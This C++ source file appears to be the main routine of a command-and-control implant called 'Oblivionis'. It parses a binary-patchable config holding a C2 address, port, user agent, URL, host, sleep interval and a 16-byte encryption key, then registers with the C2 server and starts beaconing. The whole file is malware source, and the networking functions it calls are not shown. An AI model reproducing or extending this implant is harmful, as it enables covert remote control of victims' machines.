#include<cstdio>
#include<cstdlib>
#include "Network.hpp"
/* Config 格式:
|c2addr|c2port|useragent|url|host|sleep|16 bytes A
*/
char configData[1024] = {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h'};

void printConfig(OblivionisConfig *config) {
    printf("c2 addr   = %s\n", config->c2addr);
    printf("c2 port   = %d\n", config->c2port);
    printf("useragent = %s\n", config->useragent);
    printf("url       = %s\n", config->url);
    printf("host      = %s\n", config->host);
    printf("sleep     = %d\n", config->sleep);
    printf("encrypt_a = ");
    for(int i = 0; i < 16; i++) {
        printf("%02x ", config->a[i]);
    }
    printf("\n");
}
int findNext(int n) {
    int i;
    for(i = n; configData[i] != '|'; i++);
    return i;
}
int main() {
    OblivionisConfig *config = getConfig();
    int n, n2;

    config->c2addr = (const char *)(configData + 1);
    n = findNext(1);
    configData[n] = '\x00'; // |c2addr\x00c2port|...
    n2 = findNext(n);
    configData[n2] = '\x00'; // |c2addr\x00c2port\x00...

    sscanf(configData + n + 1, "%d", &(config->c2port));
    //config->c2port = 8080;

    //config->useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36";
    config->useragent = (const char *)(configData + n2 + 1);
    n = findNext(n2);
    configData[n] = '\x00'; // |c2addr \x00 c2port \x00 useragent \x00...

    config->url = (const char *)(configData + n + 1);
    n = findNext(n);
    configData[n] = '\x00';

    config->host = (const char *)(configData + n + 1);
    n = findNext(n);
    configData[n] = '\x00';

    sscanf(configData + n + 1, "%d", &(config->sleep));
    //config->sleep = 500;
    n = findNext(n);
    config->a = (unsigned char *)(configData + n + 1);
    //printConfig(config);

    networkSuitInitial();
    registerC2();
    PostBreath();
    return 0;
}